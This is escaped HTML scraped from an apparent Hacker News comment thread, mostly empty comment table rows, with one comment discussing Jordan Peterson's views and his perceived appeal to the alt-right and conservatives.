&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.4652406417112&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046503&quot; readability=&quot;3.2814371257485&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.6407185628743&quot;&gt;&lt;tr readability=&quot;3.2814371257485&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16048651&quot; readability=&quot;5.2811059907834&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.6405529953917&quot;&gt;&lt;tr readability=&quot;5.2811059907834&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046638&quot; readability=&quot;0.59459459459459&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046815&quot; readability=&quot;15.697656840514&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;7.848828420257&quot;&gt;&lt;tr readability=&quot;15.697656840514&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;17.169312169312&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047792&quot; readability=&quot;16.609350237718&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;8.304675118859&quot;&gt;&lt;tr readability=&quot;16.609350237718&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;11.724247226624&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047656&quot; readability=&quot;16.738891936369&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;8.3694459681843&quot;&gt;&lt;tr readability=&quot;16.738891936369&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;13.292649478881&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046949&quot; readability=&quot;5.0883977900552&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.5441988950276&quot;&gt;&lt;tr readability=&quot;5.0883977900552&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.3922651933702&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047519&quot; readability=&quot;5.6658227848101&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.8329113924051&quot;&gt;&lt;tr readability=&quot;5.6658227848101&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.1936708860759&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16049247&quot; readability=&quot;0.96551724137931&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16049632&quot; readability=&quot;4.5248868778281&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.262443438914&quot;&gt;&lt;tr readability=&quot;4.5248868778281&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;200&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;4.5248868778281&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046680&quot; readability=&quot;5.3035714285714&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.6517857142857&quot;&gt;&lt;tr readability=&quot;5.3035714285714&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.5357142857143&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047463&quot; readability=&quot;9.4346978557505&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.7173489278752&quot;&gt;&lt;tr readability=&quot;9.4346978557505&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;8.5769980506823&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047907&quot; readability=&quot;15.668508287293&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;7.8342541436464&quot;&gt;&lt;tr readability=&quot;15.668508287293&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;18.116712707182&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16048456&quot; readability=&quot;1.2676056338028&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047526&quot; readability=&quot;3.4378378378378&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7189189189189&quot;&gt;&lt;tr readability=&quot;3.4378378378378&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.4378378378378&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16048087&quot; readability=&quot;2.3125&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047430&quot; readability=&quot;4&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2&quot;&gt;&lt;tr readability=&quot;4&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.6&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047571&quot; readability=&quot;8.6666666666667&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.3333333333333&quot;&gt;&lt;tr readability=&quot;8.6666666666667&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;8.1851851851852&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16049391&quot; readability=&quot;4.8082386363636&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.4041193181818&quot;&gt;&lt;tr readability=&quot;4.8082386363636&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;200&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;11.058948863636&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16049585&quot; readability=&quot;7.5883668903803&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.7941834451902&quot;&gt;&lt;tr readability=&quot;7.5883668903803&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;240&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16049276&quot; readability=&quot;2.3478260869565&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16049608&quot; readability=&quot;2.6057142857143&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.3028571428571&quot;&gt;&lt;tr readability=&quot;2.6057142857143&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;240&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.4742857142857&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16048379&quot; readability=&quot;6.5495978552279&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.2747989276139&quot;&gt;&lt;tr readability=&quot;6.5495978552279&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.6139410187668&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047921&quot; readability=&quot;3.2405063291139&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.620253164557&quot;&gt;&lt;tr readability=&quot;3.2405063291139&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.2405063291139&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16046973&quot; readability=&quot;2.6826347305389&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047402&quot; readability=&quot;16.817439862543&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;8.4087199312715&quot;&gt;&lt;tr readability=&quot;16.817439862543&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;21.763745704467&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16049347&quot; readability=&quot;3.6156583629893&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.8078291814947&quot;&gt;&lt;tr readability=&quot;3.6156583629893&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.423487544484&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047512&quot; readability=&quot;8.46138996139&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.230694980695&quot;&gt;&lt;tr readability=&quot;8.46138996139&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.6409266409266&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047976&quot; readability=&quot;6.5093457943925&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.2546728971963&quot;&gt;&lt;tr readability=&quot;6.5093457943925&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.1144859813084&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16048418&quot; readability=&quot;5.8355640535373&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.9177820267686&quot;&gt;&lt;tr readability=&quot;5.8355640535373&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;6.6692160611855&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047544&quot; readability=&quot;4.9471458773784&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.4735729386892&quot;&gt;&lt;tr readability=&quot;4.9471458773784&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.7103594080338&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047605&quot; readability=&quot;3.5229357798165&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7614678899083&quot;&gt;&lt;tr readability=&quot;3.5229357798165&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.5229357798165&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16047814&quot; readability=&quot;2.5508982035928&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.2754491017964&quot;&gt;&lt;tr readability=&quot;2.5508982035928&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;200&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16049016&quot; readability=&quot;32.847750865052&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;16.423875432526&quot;&gt;&lt;tr readability=&quot;32.847750865052&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;40.313148788927&quot;&gt;

&lt;br/&gt;&lt;div class=&quot;comment&quot; readability=&quot;54.946921443737&quot;&gt;&lt;span class=&quot;c00&quot;&gt;That comment/subdiscussion you're linking to on the subreddit seems like a pretty good examination of the relationship that's developed between him and the alt-right. Or at least part of one.&lt;/span&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;But I'm puzzled by the statement that the comment you're responding to accurately describes Peterson's views on race. Except maybe in narrow categories that don't match up particularly well with a broad conception like &quot;race&quot; (e.g., Ashkenazi Jews), I can't recall any instances of him asserting a correlation between race and IQ, though it's possible I've missed something, and I'm open to visiting anything you might want to point out.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;And I also think that it's a mistake to boil the alt-right relationship down to race issues. I think it starts elsewhere. In addition to the points in that reddit discussion, I think there's a fundamental shared narrative that goes something like this:&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;&quot;Some (or all!) of the people and institutions that make up society are hostile to people speaking the truth freely. Maybe even more hostile to it than they were in the past. They are hostile to it because they are weak and corrupt and tyrannical. But it's important thing for people to speak up anyway.&quot;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;Peterson &lt;em&gt;absolutely&lt;/em&gt; says this, repeatedly and quite clearly. And it resonates, because most people probably &lt;em&gt;have&lt;/em&gt; been in situations where they've faced hostility and even retaliation for saying something that others didn't like.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;And I think if you pressed Peterson, he would probably say that this narrative is part of the human condition, and the reason why he frames the problem as people being weak and corrupt and tyrannical is that it's a known failure mode for pretty much all of humanity and it's probably true in some degree inside every single human being. And it's important to speak up anyway not necessarily because you are the sole promethean bearer of The Truth, but because &lt;em&gt;nobody&lt;/em&gt; is the lone possessor of the truth and we will likely do better at working things out if we have conversations and negotiate. I think this line of argument has some limits that I'm not sure are sufficiently explored, but it's a pretty compelling one based on my own introspection and observation of humans, though I also find that the degree of &quot;corrupt&quot;ness in the hypothetical human you're dealing with matters &lt;em&gt;a lot&lt;/em&gt;, and I also think Peterson may underestimate the downside of using language like &quot;weak and corrupt and tyrannical&quot; because it invites contempt into the understanding of the situation and that usually doesn't make things better.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;But for some segments of the right (among other people), I think this narrative often goes farther. It is not a description of part of what it's like to exist as a human among other humans, it is part of repeated liturgy about the problem of being a conservative in a society besieged by malevolent political opposition. It says that conservatives in particular are unjustly singled out for this kind of treatment, and that it's much more often because of bias rather than any flaws in their own position, and that the weak and corrupt and tyrannical people are Marxists who want a totalitarian state, and what you have to say is not only important because the process of dialogue helps with synthesis but it's important because it's the Capital-RT Real Truth whose only flaw is that too many people aren't brave or strong enough to look it in the eye and understand it, and the only hope is that you repeat it often and strongly enough without being seduced.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;(And again, the right is hardly the only segment of humanity that starts to think like this, but I don't think there's any credible argument that this narrative isn't deeply embedded in current political conservatism in the US.)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;Now, I happen to think that there's an important distinction between the former and the latter formation of this narrative. But no matter how nuanced someone is being, if you lower the resolution at which you're &lt;em&gt;listening&lt;/em&gt; to someone present both, you might not be able to tell the difference. One could imagine that someone who can't tell the difference between &quot;IQ matters and has a genetic component&quot; and &quot;you can make sensible generalizations about a person's IQ by race (and we should!)&quot; might have precisely that problem.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;And though I think JBP tends to be nuanced and I &lt;em&gt;try&lt;/em&gt; to pay attention to that... frankly, there are times when &lt;em&gt;I&lt;/em&gt; can't tell the difference between the former and the latter (which seems weird to me considering how widely prevalent and accepted many conservative ideas among my social circle and in the institutions I tend to participate in. But then again, I don't work at a University, and I grew up in a conservative state and am part of a religious subculture, and so most of the time when I'm facing an uphill battle in a discussion it's quite the opposite).&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;So I think that's where the love-in begins. It probably also helps that JBP defends the value and message of traditional religious stories and focuses quite a bit on personal responsibility (perhaps as contrasted with state measures) and the merits of conscientiousness and bringing order into the world -- all things that are likely to resonate with conservatives. &lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16048179&quot; readability=&quot;20.521562245728&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;10.260781122864&quot;&gt;&lt;tr readability=&quot;20.521562245728&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;20.521562245728&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16048364&quot; readability=&quot;19.492385786802&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;9.746192893401&quot;&gt;&lt;tr readability=&quot;19.492385786802&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;11.208121827411&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;16048611&quot; readability=&quot;6.6069518716578&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.3034759358289&quot;&gt;&lt;tr readability=&quot;6.6069518716578&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;200&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;4.2473262032086&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
